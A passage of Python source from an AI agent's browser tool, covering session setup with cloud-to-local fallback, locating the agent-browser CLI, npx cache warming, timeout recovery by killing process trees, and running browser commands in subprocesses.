    # for all of them - including any tool a future upstream merge adds -
    # without the model having to remember to open anything first.
    if not force_local:
        _ensure_managed_browser(task_id)

    # Create session outside the lock (network call in cloud mode)
    cdp_override = _get_cdp_override()
    if cdp_override and not force_local:
        session_info = _create_cdp_session(task_id, cdp_override)
    elif force_local:
        # Hybrid private-URL sidecar: NEVER the real profile (see
        # _create_local_session — presenting real cookies to an arbitrary LAN
        # host the model routed here is unconsented exposure).
        session_info = _create_local_session(task_id, allow_real_profile=False)
    else:
        provider = _get_cloud_provider()
        if provider is None:
            session_info = _create_local_session(task_id)
        else:
            try:
                session_info = provider.create_session(task_id)
                # Validate cloud provider returned a usable session
                if not session_info or not isinstance(session_info, dict):
                    raise ValueError(f"Cloud provider returned invalid session: {session_info!r}")
                if session_info.get("cdp_url"):
                    # Some cloud providers (including Browser-Use v3) return an HTTP
                    # CDP discovery URL instead of a raw websocket endpoint.
                    session_info = dict(session_info)
                    session_info["cdp_url"] = _resolve_cdp_override(str(session_info["cdp_url"]))
            except Exception as e:
                provider_name = type(provider).__name__
                logger.warning(
                    "Cloud provider %s failed (%s); attempting fallback to local "
                    "Chromium for task %s",
                    provider_name, e, task_id,
                    exc_info=True,
                )
                try:
                    session_info = _create_local_session(task_id)
                except Exception as local_error:
                    raise RuntimeError(
                        f"Cloud provider {provider_name} failed ({e}) and local "
                        f"fallback also failed ({local_error})"
                    ) from e
                # Mark session as degraded for observability
                if isinstance(session_info, dict):
                    session_info = dict(session_info)
                    session_info["fallback_from_cloud"] = True
                    session_info["fallback_reason"] = str(e)
                    session_info["fallback_provider"] = provider_name

    with _cleanup_lock:
        # Double-check: another thread may have created a session while we
        # were doing the network call. Use the existing one to avoid leaking
        # orphan cloud sessions.
        if task_id in _active_sessions:
            return _active_sessions[task_id]
        session_info = dict(session_info)
        session_info.setdefault("session_key", task_id)
        session_info.setdefault("owner_task_id", _bare_task_id_for_session_key(task_id))
        _active_sessions[task_id] = session_info
        # A brand-new session is healthy by definition — drop any stale
        # suspect flag left by a wedged-path eviction of its predecessor.
        _suspect_browser_sessions.pop(task_id, None)

    # Lazy-start the CDP supervisor now that the session exists (if the
    # backend surfaces a CDP URL via override or session_info["cdp_url"]).
    # Idempotent; swallows errors. See _ensure_cdp_supervisor for details.
    # Skip for local sidecars — they have no CDP URL — and for Lightpanda
    # sessions: those only exist in Browser Use mode, where the browser_*
    # tools that consume supervisor state are hidden, so the supervisor
    # would just hold an idle second CDP connection to the process.
    if not force_local and not (session_info.get("features") or {}).get("lightpanda"):
        _ensure_cdp_supervisor(task_id)

    return session_info



def _agent_browser_candidate_present(path: str | None) -> bool:
    if not path:
        return False
    if " " in path and path.split()[0].endswith("npx"):
        return True
    return os.path.exists(path) and (os.name == "nt" or os.access(path, os.X_OK))


def _resolve_npx_bin() -> Optional[str]:
    """Resolve a runnable npx binary, preferring the Hermes-managed/Homebrew
    extended search over a bare ambient PATH lookup.

    Checking bare PATH first would let a broken or unrelated system npx
    shadow a healthy Hermes-managed one with no recovery — every candidate
    is therefore validated with ``node_tool_runnable`` (the same check
    ``find_hermes_node_executable`` uses to self-heal a managed Node tree)
    before being trusted, falling through to the next candidate otherwise.
    """
    extended_path = _merge_browser_path("")
    if extended_path:
        extended_npx = shutil.which("npx", path=extended_path)
        if extended_npx and node_tool_runnable(extended_npx):
            return extended_npx
    npx_path = shutil.which("npx")
    if npx_path and node_tool_runnable(npx_path):
        return npx_path
    return None


def _find_agent_browser(*, validate: bool = True) -> str:
    """
    Find the agent-browser CLI executable.

    Checks in order: current PATH, Homebrew/common bin dirs, Hermes-managed
    node, local node_modules/.bin/, npx fallback.

    Returns:
        Path to agent-browser executable

    Raises:
        FileNotFoundError: If agent-browser is not installed
    """
    global _cached_agent_browser, _agent_browser_resolved
    if _agent_browser_resolved:
        if _cached_agent_browser is None:
            raise FileNotFoundError(
                "agent-browser CLI not found (cached). Install it with: "
                f"{_browser_install_hint()}\n"
                "Or ensure npx is available in your PATH."
            )
        return _cached_agent_browser

    # Note: _agent_browser_resolved is set at each return site below
    # (not before the search) to prevent a race where a concurrent thread
    # sees resolved=True but _cached_agent_browser is still None.
    #
    # Every candidate below is validated with ``agent_browser_runnable`` before
    # it is cached. A bare ``shutil.which`` hit is NOT trusted: agent-browser's
    # npm postinstall re-points a global install symlink at our local
    # node_modules binary, which disappears on the next ``hermes update`` and
    # leaves a dangling link that ``which`` still reports but exec fails on with
    # exit 127 (issue #48521). Validating lets a dead candidate fall through to
    # the next working resolution (extended PATH → local .bin → npx) instead of
    # caching the broken one and silently killing every browser tool.

    # Check if it's in PATH (global install)
    which_result = shutil.which("agent-browser")
    if which_result and (
        agent_browser_runnable(which_result) if validate else _agent_browser_candidate_present(which_result)
    ):
        if not validate:
            return which_result
        _cached_agent_browser = which_result
        _agent_browser_resolved = True
        return which_result

    # Build an extended search PATH including Hermes-managed Node, macOS
    # versioned Homebrew installs, and fallback system dirs like Termux.
    extended_path = _merge_browser_path("")
    if extended_path:
        which_result = shutil.which("agent-browser", path=extended_path)
        if which_result and (
            agent_browser_runnable(which_result) if validate else _agent_browser_candidate_present(which_result)
        ):
            if not validate:
                return which_result
            _cached_agent_browser = which_result
            _agent_browser_resolved = True
            return which_result

    # Check local node_modules/.bin/ (npm install in repo root).
    # On Windows, npm drops three shims in .bin: an extensionless POSIX shell
    # script (for Git Bash / WSL), `agent-browser.cmd` (for cmd/PowerShell),
    # and `agent-browser.ps1` (for PowerShell). CreateProcess (used by Python's
    # subprocess on Windows) cannot execute the extensionless shim — it raises
    # WinError 193 "%1 is not a valid Win32 application". We must resolve to the
    # `.cmd` shim instead. `shutil.which` consults PATHEXT, so we delegate to it
    # with an explicit path so POSIX hosts still pick the extensionless shim.
    repo_root = Path(__file__).parent.parent
    local_bin_dir = repo_root / "node_modules" / ".bin"
    if local_bin_dir.is_dir():
        local_which = shutil.which("agent-browser", path=str(local_bin_dir))
        if local_which and (
            agent_browser_runnable(local_which) if validate else _agent_browser_candidate_present(local_which)
        ):
            if not validate:
                return local_which
            _cached_agent_browser = local_which
            _agent_browser_resolved = True
            return _cached_agent_browser

    # Check common npx locations (also search the extended fallback PATH)
    npx_path = _resolve_npx_bin()
    if npx_path:
        if not validate:
            return NPX_AGENT_BROWSER_SENTINEL
        _cached_agent_browser = NPX_AGENT_BROWSER_SENTINEL
        _agent_browser_resolved = True
        return _cached_agent_browser

    if not validate:
        raise FileNotFoundError("agent-browser CLI not found")

    # Nothing found — try lazy installation before giving up.
    try:
        from hermes_cli.dep_ensure import ensure_dependency
        if ensure_dependency("browser"):
            candidates = [
                shutil.which("agent-browser"),
                shutil.which("agent-browser", path=extended_path) if extended_path else None,
                shutil.which("agent-browser", path=str(get_hermes_home() / "node_modules" / ".bin")),
                shutil.which("agent-browser", path=str(get_hermes_home() / "node" / "bin")),
                shutil.which("agent-browser", path=str(get_hermes_home() / "node")),
            ]
            for recheck in candidates:
                if recheck and agent_browser_runnable(recheck):
                    _cached_agent_browser = recheck
                    _agent_browser_resolved = True
                    return recheck
    except Exception:
        pass

    _agent_browser_resolved = True
    raise FileNotFoundError(
        "agent-browser CLI not found. Install it with: "
        f"{_browser_install_hint()}\n"
        "Or ensure npx is available in your PATH."
    )


def _kill_process_tree(proc: "subprocess.Popen") -> None:
    """Best-effort kill of *proc* and any descendants it spawned.

    ``Popen.kill()`` only signals the direct child PID. npm/npx routinely
    fork further processes (registry-fetch helpers, npm's own lifecycle
    runner, agent-browser's own detached daemon grandchild) that can survive
    a plain ``kill()`` of the top-level PID and keep a ``capture_output``-style
    pipe open, hanging the caller's ``communicate()`` past the nominal
    timeout — the same orphaned-pipe hazard already hit in production on
    POSIX (see ``tools/process_registry.py``'s ``_reader_loop``, issue
    #68915: a backgrounded grandchild inheriting a pipe's write end kept it
    from ever reaching EOF). That hazard is cross-platform, not
    Windows-specific; what *is* Windows-specific is the lack of a remedy
    other than killing the tree — anonymous pipes there don't support
    overlapped I/O, so there's no ``select()``-style non-blocking read to
    poll around a stuck grandchild the way POSIX can. Killing the whole
    process group/tree the child was launched into reaches those
    descendants on both platforms.

    Fires SIGTERM then SIGKILL back-to-back with no grace period between
    them (unlike ``tools/mcp_death_supervisor.py``'s ``_reap``, which waits
    between signals because it's reacting to a live daemon being orphaned).
    By the time this is called, the caller has already burned its
    full timeout budget waiting for a graceful exit — there's nothing to gain
    from waiting again here, only more delay on an already-timed-out call.

    Delegates to :func:`agent.deadline.kill_process_tree` (#85125 4d): same
    ``taskkill /T /F`` on Windows and killpg-when-group-leader on POSIX, plus
    a psutil descendant sweep that also reaches descendants that ``setsid``'d
    into their own session (agent-browser's detached daemon grandchild).
    SIGKILL-only instead of the old zero-grace SIGTERM→SIGKILL pair — the
    grace period was already zero, so the observable effect is identical.
    Any delegation failure falls back to the original local implementation
    (:func:`_legacy_kill_process_tree`); never raises either way.
    """
    try:
        from agent.deadline import kill_process_tree as _deadline_kill_tree

        _deadline_kill_tree(proc.pid)
    except Exception:
        _legacy_kill_process_tree(proc)


def _legacy_kill_process_tree(proc: "subprocess.Popen") -> None:
    """Pre-#85125 local tree-kill — fallback when agent.deadline is unavailable."""
    if os.name == "nt":
        try:
            subprocess.run(
                ["taskkill", "/PID", str(proc.pid), "/T", "/F"],
                check=False,
                capture_output=True,
                stdin=subprocess.DEVNULL,
            )
        except Exception:
            pass
        return
    # os.killpg/signal.SIGKILL don't exist on Windows; this branch is
    # POSIX-only (the `os.name == "nt"` check above already returns first
    # on Windows), but resolve them defensively via getattr anyway so an
    # accidental future refactor that drops that guard degrades to a plain
    # kill() instead of AttributeError — same discipline as
    # tools/mcp_death_supervisor.py's _reap.
    killpg = getattr(os, "killpg", None)
    if killpg is None:  # windows-footgun: ok - non-POSIX fallback
        try:
            proc.kill()
        except Exception:
            pass
        return
    try:
        pgid = os.getpgid(proc.pid)
    except (ProcessLookupError, OSError):
        return
    sigkill = getattr(signal, "SIGKILL", signal.SIGTERM)
    for sig in (signal.SIGTERM, sigkill):
        try:
            killpg(pgid, sig)
        except (ProcessLookupError, PermissionError, OSError):
            return


def warm_agent_browser_npx_cache(timeout: float = 60.0) -> bool:
    """Best-effort pre-fetch of the agent-browser npm package via npx.

    agent-browser is no longer a root package.json dependency (#43564) —
    it resolves lazily via ``npx agent-browser`` instead, which keeps it
    out of the npm workspace install graph entirely (nothing to prune it
    anymore) but means the first real invocation in a session would
    otherwise pay npx's registry-lookup/fetch cost. Calling this during
    ``hermes update`` (or ``hermes doctor --fix``) warms npx's own cache
    ahead of time, restoring the "available before any session starts"
    property agent-browser had while it was an eager root dependency —
    without re-entangling it with the workspace graph.

    Runs a credential-scrubbed, PATH-propagated environment matching every
    other agent-browser subprocess spawn (see ``_build_browser_env``) —
    this used to inherit the full parent environment, including every
    provider/gateway credential Hermes holds, while running registry-fetched
    npm code on every ``hermes update`` (the GHSA-m4m8-xjp4-5rmm class of
    risk ``_build_browser_env`` exists specifically to prevent). Runs in its
    own process group and kills the *whole* group — not just the top-level
    npx PID — on timeout, since a surviving descendant can otherwise hold a
    capture pipe open past the nominal deadline (see ``_kill_process_tree``).

    Fire-and-forget: never raises, always safe to call opportunistically.
    Returns True only if npx actually ran successfully (npx unavailable,
    a timeout, or a nonzero exit all return False silently).
    """
    npx_bin = _resolve_npx_bin()
    if not npx_bin:
        return False

    env = _build_browser_env()
    env["PATH"] = _merge_browser_path(env.get("PATH", ""))

    popen_kwargs: dict = {
        "stdout": subprocess.PIPE,
        "stderr": subprocess.PIPE,
        "text": True,
        "env": env,
        "creationflags": windows_hide_flags(),
    }
    if os.name == "posix":
        popen_kwargs["start_new_session"] = True
    else:
        popen_kwargs["creationflags"] |= getattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0)

    cmd = [
        npx_bin,
        # --ignore-scripts: AGENT_BROWSER_NPX_SPEC is a floating ^0.26.0
        # range, not an exact pin — a compromised future 0.26.x patch must
        # not get to run its own install-time lifecycle scripts here.
        "--ignore-scripts",
        # --prefer-offline: once cached, repeat `hermes update`/`doctor
        # --fix` runs shouldn't hit the registry just to re-confirm
        # "latest" is still latest — that would defeat the point of
        # warming the cache in the first place.
        "--prefer-offline",
        "-y",
        AGENT_BROWSER_NPX_SPEC,
        "--version",
    ]
    try:
        proc = subprocess.Popen(cmd, stdin=subprocess.DEVNULL, **popen_kwargs)
    except Exception:
        return False
    try:
        proc.communicate(timeout=timeout)
        return proc.returncode == 0
    except subprocess.TimeoutExpired:
        _kill_process_tree(proc)
        try:
            proc.communicate(timeout=5)
        except Exception:
            pass
        return False
    except Exception:
        _kill_process_tree(proc)
        return False


def _extract_screenshot_path_from_text(text: str) -> Optional[str]:
    """Extract a screenshot file path from agent-browser human-readable output."""
    if not text:
        return None

    patterns = [
        r"Screenshot saved to ['\"](?P<path>/[^'\"]+?\.png)['\"]",
        r"Screenshot saved to (?P<path>/\S+?\.png)(?:\s|$)",
        r"(?P<path>/\S+?\.png)(?:\s|$)",
    ]

    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            path = match.group("path").strip().strip("'\"")
            if path:
                return path

    return None


def _discard_timed_out_browser_session(
    task_id: str,
    session_info: Dict[str, Any],
    task_socket_dir: str,
) -> None:
    """Drop a stuck client generation without losing cloud cleanup state."""
    with _cleanup_lock:
        if _active_sessions.get(task_id) is not session_info:
            return
        _stop_cdp_supervisor(task_id)
        if session_info.get("bb_session_id") or session_info.get("cdp_url"):
            import uuid
            replacement = dict(session_info)
            replacement["session_name"] = f"h_{uuid.uuid4().hex[:10]}"
            replacement.pop("_first_nav", None)
            _active_sessions[task_id] = replacement
        else:
            _active_sessions.pop(task_id, None)
            _session_last_activity.pop(task_id, None)

        bare_task_id = _bare_task_id_for_session_key(task_id)
        if _last_active_session_key.get(bare_task_id) == task_id:
            _last_active_session_key.pop(bare_task_id, None)

    session_name = str(session_info.get("session_name") or "")
    if session_name:
        pid_file = os.path.join(task_socket_dir, f"{session_name}.pid")
        if os.path.isfile(pid_file):
            try:
                daemon_pid = int(Path(pid_file).read_text(encoding="utf-8").strip())
                if not _verify_reapable_browser_daemon(daemon_pid, task_socket_dir, session_name):
                    return
                # Tree-kill (#68139 / #85125 4c): the daemon spawns Chromium
                # children; terminating only the daemon PID leaks the whole
                # Chromium tree.  agent.deadline.kill_process_tree escalates
                # SIGTERM → SIGKILL across the tree.
                from agent import deadline as _deadline

                _deadline.kill_process_tree(daemon_pid)
            except (ProcessLookupError, ValueError, PermissionError, OSError):
                logger.debug("Could not kill timed-out browser daemon for %s", session_name)
                return
    shutil.rmtree(task_socket_dir, ignore_errors=True)


def _read_browser_daemon_pid(task_socket_dir: str, session_name: str) -> Optional[int]:
    """Read the agent-browser daemon PID for a session (best-effort)."""
    pid_file = os.path.join(task_socket_dir, f"{session_name}.pid")
    try:
        return int(Path(pid_file).read_text(encoding="utf-8").strip())
    except (OSError, ValueError):
        return None


def _browser_daemon_responsive(task_socket_dir: str, probe_timeout_s: float = 1.0) -> bool:
    """Cheap liveness probe: can we connect to the daemon's control socket?

    The agent-browser daemon listens on a unix socket inside the session's
    socket dir.  A successful connect proves the daemon's accept loop is
    alive (the timed-out command was wedged on the page/CDP side, not the
    daemon).  A refused / missing / timed-out connect means the daemon is
    wedged or dead.  Windows agent-browser uses named pipes, not unix
    sockets — no probe is possible there, so we conservatively report
    unresponsive (tree-kill + respawn is the safe recovery).
    """
    if os.name == "nt":
        return False
    import socket as socket_mod

    if not hasattr(socket_mod, "AF_UNIX"):
        return False
    try:
        entries = os.listdir(task_socket_dir)
    except OSError:
        return False
    sock_paths = [
        os.path.join(task_socket_dir, e) for e in entries if e.endswith(".sock")
    ]
    for sock_path in sock_paths:
        try:
            with socket_mod.socket(socket_mod.AF_UNIX, socket_mod.SOCK_STREAM) as s:
                s.settimeout(probe_timeout_s)
                s.connect(sock_path)
                return True
        except OSError:
            continue
    return False


def _handle_browser_command_timeout(
    task_id: str,
    session_info: Dict[str, Any],
    task_socket_dir: str,
) -> None:
    """Recover session state after a browser command timeout (#72205, #68139).

    The wedged-vs-alive rule:

    * **Cloud / CDP sessions** — there is no local daemon to probe or kill.
      Replace the stuck client generation immediately (fresh ``session_name``,
      same ``bb_session_id`` so cloud cleanup still works) — #72206's
      original behavior, preserved verbatim.
    * **Local daemon alive** (PID readable, process alive, identity-verified
      as ours, control socket accepts a connection): the *command* wedged —
      page hang, stuck navigation — but the daemon itself is fine.  Killing
      it would be overkill and slow.  Mark the session suspect only; the
      next use recycles it through ``ensure_healthy`` → clean agent-browser
      ``close`` → fresh session.
    * **Local daemon wedged or dead** (no PID, dead PID, failed identity
      check, or unresponsive socket): the daemon cannot service a clean
      close, and its Chromium children would leak.  Tree-kill the daemon's
      process tree via ``agent.deadline.kill_process_tree`` and evict the
      cache entry now; the next browser call respawns from scratch.

    Both local branches ``mark_suspect`` first — cheap, lock-free — so the
    poisoned-cache invariant holds even if the eviction below races another
    thread's replacement (``_discard_timed_out_browser_session`` no-ops on a
    concurrent replacement; the flag then triggers one harmless no-op
    teardown at next use).
    """
    if session_info.get("bb_session_id") or session_info.get("cdp_url"):
        _discard_timed_out_browser_session(task_id, session_info, task_socket_dir)
        return

    _browser_session_backend(task_id).mark_suspect(
        "browser command timed out; session may be poisoned"
    )

    session_name = str(session_info.get("session_name") or "")
    daemon_pid = _read_browser_daemon_pid(task_socket_dir, session_name) if session_name else None
    daemon_alive = (
        daemon_pid is not None
        and _pid_exists(daemon_pid)
        and _verify_reapable_browser_daemon(daemon_pid, task_socket_dir, session_name)
        and _browser_daemon_responsive(task_socket_dir)
    )
    if daemon_alive:
        logger.warning(
            "browser daemon for %s is alive after command timeout; session "
            "marked suspect and will be recycled at next use", task_id,
        )
        return

    logger.warning(
        "browser daemon for %s is wedged or dead after command timeout; "
        "tree-killing and evicting the session", task_id,
    )
    _discard_timed_out_browser_session(task_id, session_info, task_socket_dir)
    # The poisoned entry is gone (evicted, or superseded by a concurrent
    # replacement discard refused to touch) — either way the cache no longer
    # holds the timed-out session, so drop the flag: it must not poison a
    # session created later under the same key.
    _suspect_browser_sessions.pop(task_id, None)


def _pid_exists(pid: int) -> bool:
    """Best-effort 'is this PID alive' check (signal 0 / psutil on Windows)."""
    if pid <= 0:
        return False
    if os.name == "nt":
        try:
            import psutil

            return psutil.pid_exists(pid)
        except Exception:
            return False
    try:
        os.kill(pid, 0)  # windows-footgun: ok — psutil.pid_exists above handles Windows
    except ProcessLookupError:
        return False
    except PermissionError:
        return True
    except OSError:
        return False
    return True


def _run_browser_command(
    task_id: str,
    command: str,
    args: List[str] = None,
    timeout: Optional[int] = None,
    _engine_override: Optional[str] = None,
) -> Dict[str, Any]:
    """
    Run an agent-browser CLI command using our pre-created Browserbase session.

    Args:
        task_id: Task identifier to get the right session
        command: The command to run (e.g., "open", "click")
        args: Additional arguments for the command
        timeout: Command timeout in seconds.  ``None`` reads
                 ``browser.command_timeout`` from config (default 30s).
        _engine_override: Force a specific engine for this call only.  Used
                          internally by the Lightpanda fallback to retry with
                          Chrome without touching global state.

    Returns:
        Parsed JSON response from agent-browser
    """
    if timeout is None:
        timeout = _safe_command_timeout()
    args = args or []

    # Build the command
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError as e:
        logger.warning("agent-browser CLI not found: %s", e)
        return {"success": False, "error": str(e)}

    if _requires_real_termux_browser_install(browser_cmd):
        error = _termux_browser_install_error()
        logger.warning("browser command blocked on Termux: %s", error)
        return {"success": False, "error": error}

    # Local mode with no Chromium on disk: fail fast with an actionable
    # message instead of hanging for _command_timeout seconds per call.
    # Skip when engine=lightpanda — LP doesn't need Chromium for navigation.
    if (
        _is_local_mode()
        and not _chromium_installed()
        and _get_browser_engine() != "lightpanda"
        and not _maybe_autoinstall_chromium()
    ):
        if _running_in_docker():
            hint = (
                "Chromium browser is missing. You're running in Docker — pull "
                "the latest image to get the bundled Chromium: "
                "docker pull ghcr.io/nousresearch/hermes-agent:latest"
            )
        else:
            hint = (
                "Chromium browser is missing. Install it with: "
                "npx agent-browser install --with-deps "
                "(or: npx playwright install --with-deps chromium)"
            )
        logger.warning("browser command blocked: %s", hint)
        return {"success": False, "error": hint}

    from tools.interrupt import is_interrupted
    if is_interrupted():
        return {"success": False, "error": "Interrupted"}

    # Get session info (creates Browserbase session with proxies if needed)
    try:
        session_info = _get_session_info(task_id)
    except Exception as e:
        logger.warning("Failed to create browser session for task=%s: %s", task_id, e)
        return {"success": False, "error": f"Failed to create browser session: {str(e)}"}
    # Cleanup stops the supervisor before closing the backend; keep it stopped.
    if command != "close" and session_info.get("cdp_url"):
        _ensure_cdp_supervisor(task_id)

    # Build the command with the appropriate backend flag.
    # Cloud mode: --cdp <websocket_url> connects to Browserbase.
    # Local mode: --session <name> launches a local headless Chromium.
    # The rest of the command (--json, command, args) is identical.
    if session_info.get("cdp_url"):
        # Cloud mode — connect to remote Browserbase browser via CDP
        # IMPORTANT: Do NOT use --session with --cdp. In agent-browser >=0.13,
        # --session creates a local browser instance and silently ignores --cdp.
        backend_args = ["--cdp", session_info["cdp_url"]]
    else:
        # Local mode — launch Chromium (headless by default, headed when configured)
        backend_args = ["--session", session_info["session_name"]]
        # Persistent-profile mode: launch-relevant flags (--profile, --headed)
        # are part of agent-browser's launch identity, so they must be passed
        # on EVERY invocation — omitting them on a later call makes the daemon
        # treat it as a different browser config and spawn a second instance.
        # Headed can come from either the global browser.headed / AGENT_BROWSER_HEADED
        # config (upstream) or the persistent-profile-scoped browser.local.headed
        # (hermes-mods) — either one is enough to launch with a visible window.
        headed = _is_headed_mode()
        if session_info.get("features", {}).get("persistent_profile"):
            local_settings = _get_local_browser_settings()
            backend_args += ["--profile", local_settings["profile_dir"]]
            headed = headed or local_settings["headed"]
        if headed:
            backend_args.append("--headed")

    # Lightpanda engine injection (local mode only, agent-browser v0.25.3+).
    # Use the resolved session backend rather than global cloud-provider state:
    # hybrid private-URL routing can create a local sidecar while a cloud
    # provider remains configured for public URLs.
    engine = _engine_override or _get_browser_engine()
    if engine != "auto" and not _is_camofox_mode() and not session_info.get("cdp_url"):
        backend_args += ["--engine", engine]

    # Keep concrete executable paths intact, even when they contain spaces.
    # Only the synthetic npx fallback needs to expand into multiple argv items.
    # Resolve via the same PATH + extended-PATH cascade _find_agent_browser
    # uses (see the chrome-fallback call site above for why a bare
    # shutil.which("npx") is wrong here).
    if _is_npx_agent_browser_sentinel(browser_cmd):
        _npx_bin = _resolve_npx_bin() or "npx"
        # --ignore-scripts: see _run_chrome_fallback_command's identical comment.
        cmd_prefix = [_npx_bin, "--ignore-scripts", "--prefer-offline", "-y", AGENT_BROWSER_NPX_SPEC]
    else:
        cmd_prefix = [browser_cmd]

    cmd_parts = cmd_prefix + backend_args + [
        "--json",
        command
    ] + args

    try:
        # Give each task its own socket directory to prevent concurrency conflicts.
        # Without this, parallel workers fight over the same default socket path,
        # causing "Failed to create socket directory: Permission denied" errors.
        task_socket_dir = os.path.join(
            _socket_safe_tmpdir(),
            f"agent-browser-{session_info['session_name']}"
        )
        os.makedirs(task_socket_dir, mode=0o700, exist_ok=True)
        # Record this hermes PID as the session owner (cross-process safe
        # orphan detection — see _write_owner_pid).
        _write_owner_pid(task_socket_dir, session_info['session_name'])
        logger.debug("browser cmd=%s task=%s socket_dir=%s (%d chars)",
                     command, task_id, task_socket_dir, len(task_socket_dir))

        browser_env = _build_browser_env()

        # Ensure subprocesses inherit the same browser-specific PATH fallbacks
        # used during CLI discovery.
        browser_env["PATH"] = _merge_browser_path(browser_env.get("PATH", ""))
        browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir

        # Tell the agent-browser daemon to self-terminate after being idle
        # for our configured inactivity timeout.  This is the daemon-side
        # counterpart to our Python-side _cleanup_inactive_browser_sessions
        # — the daemon kills itself and its Chrome children when no CLI
        # commands arrive within the window.  Added in agent-browser 0.24.
        if "AGENT_BROWSER_IDLE_TIMEOUT_MS" not in browser_env:
            idle_ms = str(BROWSER_SESSION_INACTIVITY_TIMEOUT * 1000)
            browser_env["AGENT_BROWSER_IDLE_TIMEOUT_MS"] = idle_ms

        # Chromium-only launch flags are rejected by Lightpanda. Strip both
        # the current and legacy variables for Lightpanda commands; explicit
        # Chrome commands and fallback use the shared Chromium policy.
        if engine == "lightpanda":
            _stripped_args = browser_env.pop("AGENT_BROWSER_ARGS", None)
            _stripped_flags = browser_env.pop("AGENT_BROWSER_CHROME_FLAGS", None)
            if _stripped_args is not None or _stripped_flags is not None:
                logger.debug(
                    "browser: stripped Chromium-only AGENT_BROWSER_ARGS/"
                    "AGENT_BROWSER_CHROME_FLAGS for Lightpanda command %s "
                    "(agent-browser rejects them with --engine lightpanda)",
                    command,
                )
        else:
            _apply_chromium_sandbox_args(browser_env)

        # Use temp files for stdout/stderr instead of pipes.
        # agent-browser starts a background daemon that inherits file
        # descriptors.  With capture_output=True (pipes), the daemon keeps
        # the pipe fds open after the CLI exits, so communicate() never
        # sees EOF and blocks until the timeout fires.
        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
        try:
            # See matching comment at the other Popen site above — on
            # Windows we put agent-browser in its own process group, force
            # STARTF_USESTDHANDLES so CreateProcess hands the child ONLY our
            # three explicit handles (no leaked parent-console handles to
            # confuse the Rust binary's daemon-spawn), and close_fds=True to
            # block inheritance of everything else.
            _popen_extra: dict = {}
            if os.name == "nt":
                # See matching block at the other Popen site — CREATE_NO_WINDOW
                # only, NO CREATE_NEW_PROCESS_GROUP (cancels asyncio loop task
                # on Python 3.11 Windows → KeyboardInterrupt in CLI MainThread).
                _popen_extra["creationflags"] = windows_hide_flags()
                _popen_extra["close_fds"] = True
                _si = subprocess.STARTUPINFO()
                _si.dwFlags |= subprocess.STARTF_USESTDHANDLES
                _popen_extra["startupinfo"] = _si
            proc = subprocess.Popen(
                cmd_parts,
                stdout=stdout_fd,
                stderr=stderr_fd,
                stdin=subprocess.DEVNULL,
                env=browser_env,
                **_popen_extra,
            )
        finally:
            os.close(stdout_fd)
            os.close(stderr_fd)

        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            proc.kill()
            proc.wait()
            stdout, stderr = _read_command_output_files(stdout_path, stderr_path)
            _unlink_command_output_files(stdout_path, stderr_path)
            _handle_browser_command_timeout(task_id, session_info, task_socket_dir)
            if stderr and stderr.strip():
                logger.warning(
                    "browser '%s' stderr after timeout: %s",
                    command,
                    stderr.strip()[:500],
                )
            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
                           command, timeout, task_id, task_socket_dir)
            result = {
                "success": False,
                "error": _format_browser_timeout_error(command, timeout, stdout, stderr),
            }
            # Fall through to fallback check below
        else:
            with open(stdout_path, "r", encoding="utf-8") as f:
                stdout = f.read()
            with open(stderr_path, "r", encoding="utf-8") as f:
                stderr = f.read()
            returncode = proc.returncode

            # Clean up temp files (best-effort)
            for p in (stdout_path, stderr_path):
                try:
                    os.unlink(p)
                except OSError:
                    pass

            # Log stderr for diagnostics — use warning level on failure so it's visible
            if stderr and stderr.strip():
                level = logging.WARNING if returncode != 0 else logging.DEBUG
                logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])

            stdout_text = stdout.strip()

            # Empty output with rc=0 is a broken state — treat as failure rather
            # than silently returning {"success": True, "data": {}}.
            # Some commands (close, record) legitimately return no output.
            if not stdout_text and returncode == 0 and command not in _EMPTY_OK_COMMANDS:
                logger.warning("browser '%s' returned empty output (rc=0)", command)
                result = {"success": False, "error": f"Browser command '{command}' returned no output"}
            elif stdout_text:
                try:
                    parsed = json.loads(stdout_text)
                    # Warn if snapshot came back empty (common sign of daemon/CDP issues)
                    if command == "snapshot" and parsed.get("success"):
                        snap_data = parsed.get("data", {})
                        if not snap_data.get("snapshot") and not snap_data.get("refs"):
                            logger.warning("snapshot returned empty content. "
                                           "Possible stale daemon or CDP connection issue. "
                                           "returncode=%s", returncode)
                    result = parsed
                except json.JSONDecodeError:
                    raw = stdout_text[:2000]
                    logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
                                   command, returncode, raw[:500])

                    if command == "screenshot":
                        stderr_text = (stderr or "").strip()
                        combined_text = "\n".join(
                            part for part in [stdout_text, stderr_text] if part
                        )
                        recovered_path = _extract_screenshot_path_from_text(combined_text)

                        if recovered_path and Path(recovered_path).exists():
                            logger.info(
                                "browser 'screenshot' recovered file from non-JSON output: %s",
                                recovered_path,
                            )
                            result = {
                                "success": True,
                                "data": {
                                    "path": recovered_path,
                                    "raw": raw,
                                },
                            }
                        else:
                            result = {
                                "success": False,
                                "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
                            }
                    else:
                        result = {
                            "success": False,
                            "error": f"Non-JSON output from agent-browser for '{command}': {raw}"
                        }
            elif returncode != 0:
                # Check for errors
                error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
                logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
                result = {"success": False, "error": error_msg}
            else:
                result = {"success": True, "data": {}}

    except Exception as e:
        logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
        result = {"success": False, "error": str(e)}

    # --- Lightpanda automatic Chrome fallback ---
    # If engine is lightpanda and the result looks broken, retry with Chrome.
    # This runs for ALL exit paths (timeout, empty, non-JSON, nonzero rc, parsed).
    fallback_reason = _lightpanda_fallback_reason(engine, command, result)
    if fallback_reason:
        logger.info(
